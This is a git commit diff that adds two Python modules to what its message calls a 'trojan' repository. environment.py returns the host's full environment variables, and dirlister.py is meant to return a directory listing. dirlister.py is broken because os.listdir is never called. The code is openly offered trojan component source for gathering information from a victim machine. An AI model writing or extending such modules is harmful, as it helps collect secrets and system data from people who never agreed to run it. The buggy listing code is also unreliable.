55ec5b7fb0cf430aa53c1fdcbd2fd95ea5d21df7
wwj <w_54545454@qq.com>
2026-04-25 11:20:35 +0800

    Adding repo structure for trojan.

---
+++ dirlister.py
@@ -0,0 +1,5 @@
+import os
+def run(**args):
+    print("[*] In the dirlister module")
+    file = os.listdir
+    return str(file)
---
+++ environment.py
@@ -0,0 +1,5 @@
+import os
+
+def run(**args):
+    print("[*] In the environment module")
+    return str(os.environ)
